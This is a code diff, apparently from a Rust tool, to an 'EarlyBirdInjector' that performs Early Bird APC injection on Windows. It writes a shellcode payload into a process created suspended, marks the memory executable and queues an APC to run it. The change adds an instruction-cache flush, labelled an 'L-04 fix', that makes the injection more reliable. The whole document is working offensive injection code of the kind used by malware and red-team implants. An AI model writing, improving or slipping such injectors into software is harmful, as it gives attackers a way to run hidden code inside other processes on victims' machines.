@@ -11,7 +11,7 @@ pub struct EarlyBirdInjector;
 #[cfg(windows)]
 impl Injector for EarlyBirdInjector {
     fn inject(&self, _pid: u32, payload: &[u8]) -> Result<()> {
-        use winapi::um::processthreadsapi::{CreateProcessW, ResumeThread, PROCESS_INFORMATION, STARTUPINFOW};
+        use winapi::um::processthreadsapi::{CreateProcessW, ResumeThread, PROCESS_INFORMATION, STARTUPINFOW, FlushInstructionCache};
         use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
         use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
         use winapi::um::winbase::CREATE_SUSPENDED;
@@ -60,6 +60,10 @@ impl Injector for EarlyBirdInjector {
             // Switch to execute-read before queuing the APC
             let mut old_prot = 0u32;
             VirtualProtectEx(pi.hProcess, remote_mem, payload.len(), PAGE_EXECUTE_READ, &mut old_prot);
+
+            // Flush the instruction cache so the CPU sees the written shellcode
+            // before the APC fires (required on ARM, recommended on x86 — L-04 fix).
+            FlushInstructionCache(pi.hProcess, remote_mem, payload.len());
 
             // QueueUserAPC: the callback is called when the thread enters an
             // alertable wait state.  Since the thread hasn't started yet, it
